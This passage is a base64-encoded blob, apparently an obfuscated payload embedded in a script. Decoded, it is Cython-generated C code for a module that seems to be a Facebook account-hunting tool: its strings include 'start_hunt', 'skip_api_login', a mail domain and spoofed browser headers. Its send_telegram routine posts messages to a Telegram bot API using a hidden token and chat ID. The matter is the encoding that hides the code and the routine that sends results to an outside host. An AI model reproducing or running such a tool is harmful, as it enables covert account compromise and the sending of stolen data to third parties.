nNfY29sb3Jfc2NoZW1lIF9fcHl4X3N0cmluZ190YWJbMjEyXQojZGVmaW5lIF9fcHl4X2twX3Vfc2VjX2NoX3VhIF9fcHl4X3N0cmluZ190YWJbMjEzXQojZGVmaW5lIF9fcHl4X2twX3Vfc2VjX2NoX3VhX2Z1bGxfdmVyc2lvbl9saXN0IF9fcHl4X3N0cmluZ190YWJbMjE0XQojZGVmaW5lIF9fcHl4X2twX3Vfc2VjX2NoX3VhX21vYmlsZSBfX3B5eF9zdHJpbmdfdGFiWzIxNV0KI2RlZmluZSBfX3B5eF9rcF91X3NlY19jaF91YV9tb2RlbCBfX3B5eF9zdHJpbmdfdGFiWzIxNl0KI2RlZmluZSBfX3B5eF9rcF91X3NlY19jaF91YV9wbGF0Zm9ybSBfX3B5eF9zdHJpbmdfdGFiWzIxN10KI2RlZmluZSBfX3B5eF9rcF91X3NlY19jaF91YV9wbGF0Zm9ybV92ZXJzaW9uIF9fcHl4X3N0cmluZ190YWJbMjE4XQojZGVmaW5lIF9fcHl4X2twX3Vfc2VjX2ZldGNoX2Rlc3QgX19weXhfc3RyaW5nX3RhYlsyMTldCiNkZWZpbmUgX19weXhfa3BfdV9zZWNfZmV0Y2hfbW9kZSBfX3B5eF9zdHJpbmdfdGFiWzIyMF0KI2RlZmluZSBfX3B5eF9rcF91X3NlY19mZXRjaF9zaXRlIF9fcHl4X3N0cmluZ190YWJbMjIxXQojZGVmaW5lIF9fcHl4X2twX3Vfc2VjX2ZldGNoX3VzZXIgX19weXhfc3RyaW5nX3RhYlsyMjJdCiNkZWZpbmUgX19weXhfbl91X3NlbmQgX19weXhfc3RyaW5nX3RhYlsyMjNdCiNkZWZpbmUgX19weXhfa3BfdV9zZW5kTWVzc2FnZSBfX3B5eF9zdHJpbmdfdGFiWzIyNF0KI2RlZmluZSBfX3B5eF9uX3Vfc2VuZF90ZWxlZ3JhbSBfX3B5eF9zdHJpbmdfdGFiWzIyNV0KI2RlZmluZSBfX3B5eF9u""X3Vfc2V0X25hbWUgX19weXhfc3RyaW5nX3RhYlsyMjZdCiNkZWZpbmUgX19weXhfbl91X3NoYVJfcHJlZnNfZGF0YSBfX3B5eF9zdHJpbmdfdGFiWzIyN10KI2RlZmluZSBfX3B5eF9uX3Vfc2lnbmVkX25leHQgX19weXhfc3RyaW5nX3RhYlsyMjhdCiNkZWZpbmUgX19weXhfbl91X3NraXBfYXBpX2xvZ2luIF9fcHl4X3N0cmluZ190YWJbMjI5XQojZGVmaW5lIF9fcHl4X25fdV9zbGVlcCBfX3B5eF9zdHJpbmdfdGFiWzIzMF0KI2RlZmluZSBfX3B5eF9uX3Vfc3BlYyBfX3B5eF9zdHJpbmdfdGFiWzIzMV0KI2RlZmluZSBfX3B5eF9uX3Vfc3MgX19weXhfc3RyaW5nX3RhYlsyMzJdCiNkZWZpbmUgX19weXhfbl91X3N0YXJ0IF9fcHl4X3N0cmluZ190YWJbMjMzXQojZGVmaW5lIF9fcHl4X25fdV9zdGFydF9odW50IF9fcHl4X3N0cmluZ190YWJbMjM0XQojZGVmaW5lIF9fcHl4X25fdV9zdHJpbmcgX19weXhfc3RyaW5nX3RhYlsyMzVdCiNkZWZpbmUgX19weXhfbl91X3N0cmlwIF9fcHl4X3N0cmluZ190YWJbMjM2XQojZGVmaW5lIF9fcHl4X25fdV9zeXN0ZW0gX19weXhfc3RyaW5nX3RhYlsyMzddCiNkZWZpbmUgX19weXhfbl91X3RhcmdldCBfX3B5eF9zdHJpbmdfdGFiWzIzOF0KI2RlZmluZSBfX3B5eF9rcF91X3RlbGVnbWFpbF9jb20gX19weXhfc3RyaW5nX3RhYlsyMzldCiNkZWZpbmUgX19weXhfbl91X3Rlc3QgX19weXhfc3RyaW5nX3RhYlsyNDBdCiNkZWZpbmUgX19weXhfbl91X3RleHQgX19weXhfc3RyaW5nX3RhYlsyNDFdCiNkZWZpbmUgX19weXhfa3BfdV90ZXh0X2h0bWxfYXBwbGljYXRpb25feGh0bWxfeG1sIF9fcHl4X3N0cmluZ190YWJbMjQyXQojZGVmaW5lIF9fcHl4X25fdV90aHJlYWRfaWQgX19weXhfc3RyaW5nX3RhYlsyNDNdCiNkZWZpbmUgX19weXhfbl91X3RocmVhZGluZyBfX3B5eF9zdHJpbmdfdGFiWzI0NF0KI2RlZmluZSBfX3B5eF9uX3VfdGhyb3cgX19weXhfc3RyaW5nX3RhYlsyNDVdCiNkZWZpbmUgX19weXhfbl91X3RpbWUgX19weXhfc3RyaW5nX3RhYlsyNDZdCiNkZWZpbmUgX19weXhfbl91X3RpbWVvdXQgX19weXhfc3RyaW5nX3RhYlsyNDddCiNkZWZpbmUgX19weXhfbl91X3RpbWV6b25lIF9fcHl4X3N0cmluZ190YWJbMjQ4XQojZGVmaW5lIF9fcHl4X25fdV90cnVlIF9fcHl4X3N0cmluZ190YWJbMjQ5XQojZGVmaW5lIF9fcHl4X25fdV90cnludW0gX19weXhfc3RyaW5nX3RhYlsyNTBdCiNkZWZpbmUgX19weXhfa3BfdV91cGdyYWRlX2luc2VjdXJlX3JlcXVlc3RzIF9fcHl4X3N0cmluZ190YWJbMjUxXQojZGVmaW5lIF9fcHl4X2twX3VfdXNlcl9hZ2VudCBfX3B5eF9zdHJpbmdfdGFiWzI1Ml0KI2RlZmluZSBfX3B5eF9rcF91X3YyXzNCY2xpZW50X3ZlcnNpb25fM0EyOTM1XzNCdGltIF9fcHl4X3N0cmluZ190YWJbMjUzXQojZGVmaW5lIF9fcHl4X25fdV92YWx1ZSBfX3B5eF9zdHJpbmdfdGFiWzI1NF0KI2RlZmluZSBfX3B5eF9rcF91X3ZpZXdwb3J0X3dpZHRoIF9fcHl4X3N0cmluZ190""YWJbMjU1XQojZGVmaW5lIF9fcHl4X25fdV93ZCBfX3B5eF9zdHJpbmdfdGFiWzI1Nl0KI2RlZmluZSBfX3B5eF9uX3Vfd2hpdGUgX19weXhfc3RyaW5nX3RhYlsyNTddCiNkZWZpbmUgX19weXhfbl91X3dsX2NidiBfX3B5eF9zdHJpbmdfdGFiWzI1OF0KI2RlZmluZSBfX3B5eF9rcF91X3d3d19mYWNlYm9va19jb20gX19weXhfc3RyaW5nX3RhYlsyNTldCiNkZWZpbmUgX19weXhfbl91X3hzIF9fcHl4X3N0cmluZ190YWJbMjYwXQoKI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19weXhfbV9jbGVhcihQeU9iamVjdCAqbSkgewogIF9fcHl4X21zdGF0ZXR5cGUgKmNsZWFyX21vZHVsZV9zdGF0ZSA9IF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG0pOwogIGlmICghY2xlYXJfbW9kdWxlX3N0YXRlKSByZXR1cm4gMDsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2QpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfYik7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9jeXRob25fcnVudGltZSk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV90dXBsZSk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV9ieXRlcyk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV91bmljb2RlKTsKICAjaWZkZWYgX19QeXhfQ3lGdW5jdGlvbl9VU0VECiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSk7CiAgI2VuZGlmCiAgI2lmZGVmIF9fUHl4X0Z1c2VkRnVuY3Rpb25fVVNFRAogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfRnVzZWRGdW5jdGlvblR5cGUpOwogICNlbmRpZgogICNpZiBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQKICBfX1B5eF9TdGF0ZV9SZW1vdmVNb2R1bGUoTlVMTCk7CiAgI2VuZGlmCiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcik7CiAgZm9yIChpbnQgaT0wOyBpPDI7ICsraSkgeyBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3R1cGxlW2ldKTsgfQogIGZvciAoaW50IGk9MDsgaTw0OyArK2kpIHsgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9jb2Rlb2JqX3RhYltpXSk7IH0KICBmb3IgKGludCBpPTA7IGk8MjYxOyArK2kpIHsgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9zdHJpbmdfdGFiW2ldKTsgfQogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfZmxvYXRfXzEpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfZmxvYXRfXzMpOwogIFB5X0NM""RUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzApOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzMpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzUpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzYpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEwKTsKICByZXR1cm4gMDsKfQojZW5kaWYKCiNpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURQpzdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fcHl4X21fdHJhdmVyc2UoUHlPYmplY3QgKm0sIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKSB7CiAgX19weXhfbXN0YXRldHlwZSAqdHJhdmVyc2VfbW9kdWxlX3N0YXRlID0gX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUobSk7CiAgaWYgKCF0cmF2ZXJzZV9tb2R1bGVfc3RhdGUpIHJldHVybiAwOwogIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfZCk7CiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9iKTsKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2N5dGhvbl9ydW50aW1lKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2VtcHR5X3R1cGxlKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2VtcHR5X2J5dGVzKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOwogICNpZmRlZiBfX1B5eF9DeUZ1bmN0aW9uX1VTRUQKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X0N5RnVuY3Rpb25UeXBlKTsKICAjZW5kaWYKICAjaWZkZWYgX19QeXhfRnVzZWRGdW5jdGlvbl9VU0VECiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9GdXNlZEZ1bmN0aW9uVHlwZSk7CiAgI2VuZGlmCiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8yZ2FfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKTsKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMmdhX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcik7CiAgZm9yIChpbnQgaT0wOyBpPDI7ICsraSkgeyBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3R1cGxlW2ldKTsgfQogIGZvciAoaW50IGk9MDsgaTw0OyArK2kpIHsgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9jb2Rlb2JqX3RhYltpXSk7IH0KICBmb3IgKGludCBpPTA7IGk8MjYxOyArK2kpIHsgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9zdHJpbmdfdGFiW2ldKTsgfQogIF9fUHl4X1ZJU0lU""X0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfZmxvYXRfXzEpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfZmxvYXRfXzMpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzApOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzMpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzUpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzYpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEwKTsKICByZXR1cm4gMDsKfQojZW5kaWYKCgoKCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJnYV8xc2VuZF90ZWxlZ3JhbShQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKTsgCnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJnYV8xc2VuZF90ZWxlZ3JhbSA9IHsic2VuZF90ZWxlZ3JhbSIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMmdhXzFzZW5kX3RlbGVncmFtLCBfX1B5eF9NRVRIX0ZBU1RDQUxMfE1FVEhfS0VZV09SRFMsIDB9OwpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJnYV8xc2VuZF90ZWxlZ3JhbShQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKSB7CiAgUHlPYmplY3QgKl9fcHl4X3ZfbWVzc2FnZSA9IDA7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogIENZVEhPTl9VTlVTRUQgUHlfc3NpemVfdCBfX3B5eF9uYXJnczsKICAjZW5kaWYKICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7CiAgUHlPYmplY3QqIHZhbHVlc1sxXSA9IHswfTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJzZW5kX3Rl""bGVncmFtICh3cmFwcGVyKSIsIDApOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7CiAgI2Vsc2UKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMOwogICNlbmRpZgogICNlbmRpZgogIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpOwogIHsKICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21lc3NhZ2UsMH07CiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDsKICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgNTMsIF9fcHl4X0wzX2Vycm9yKQogICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkgewogICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7CiAgICAgICAgY2FzZSAgMToKICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgNTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAwOiBicmVhazsKICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgICB9CiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7CiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJzZW5kX3RlbGVncmFtIiwgMCkgPCAwKSBfX1BZWF9FUlIoMCwgNTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBmb3IgKFB5X3NzaXplX3QgaSA9IF9fcHl4X25hcmdzOyBpIDwgMTsgaSsrKSB7CiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJzZW5kX3RlbGVncmFtIiwgMSwgMSwgMSwgaSk7IF9fUFlYX0VSUigwLCA1MywgX19weXhfTDNfZXJyb3IpIH0KICAgICAgfQogICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAxKSkgewogICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgfSBlbHNlIHsKICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9N""QUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCA1MywgX19weXhfTDNfZXJyb3IpCiAgICB9CiAgICBfX3B5eF92X21lc3NhZ2UgPSB2YWx1ZXNbMF07CiAgfQogIGdvdG8gX19weXhfTDZfc2tpcDsKICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7CiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoInNlbmRfdGVsZWdyYW0iLCAxLCAxLCAxLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCA1MywgX19weXhfTDNfZXJyb3IpCiAgX19weXhfTDZfc2tpcDo7CiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTsKICBfX3B5eF9MM19lcnJvcjo7CiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9BZGRUcmFjZWJhY2soImdhLnNlbmRfdGVsZWdyYW0iLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gTlVMTDsKICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7CiAgX19weXhfciA9IF9fcHl4X3BmXzJnYV9zZW5kX3RlbGVncmFtKF9fcHl4X3NlbGYsIF9fcHl4X3ZfbWVzc2FnZSk7CgogIAogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcGZfMmdhX3NlbmRfdGVsZWdyYW0oQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfbWVzc2FnZSkgewogIFB5T2JqZWN0ICpfX3B5eF92X0EgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X0IgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzZbM107CiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfOTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAw""OwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJzZW5kX3RlbGVncmFtIiwgMCk7CgogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMyk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgewoKICAgICAgCiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfVE9LRU4pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA1NSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNTUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIF9fcHl4X3RfNlswXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfYXBpX3RlbGVncmFtX29yZ19ib3Q7CiAgICAgIF9fcHl4X3RfNlsxXSA9IF9fcHl4X3RfNTsKICAgICAgX19weXhfdF82WzJdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9zZW5kTWVzc2FnZTsKICAgICAgX19weXhfdF80ID0gX19QeXhfUHlVbmljb2RlX0pvaW4oX19weXhfdF82LCAzLCAyOCArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfNSkgKyAxMiwgMTI3IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNSkpOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA1NSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19weXhfdl9BID0gKChQeU9iamVjdCopX19weXhfdF80KTsKICAgICAgX19weXhfdF80ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMyk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDU2LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSUQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA1Niwg""X19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hhdF9pZCwgX19weXhfdF81KSA8IDApIF9fUFlYX0VSUigwLCA1NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGV4dCwgX19weXhfdl9tZXNzYWdlKSA8IDApIF9fUFlYX0VSUigwLCA1NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wYXJzZV9tb2RlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSFRNTCkgPCAwKSBfX1BZWF9FUlIoMCwgNTYsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX3B5eF92X0IgPSAoKFB5T2JqZWN0KilfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzQgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNSA9IE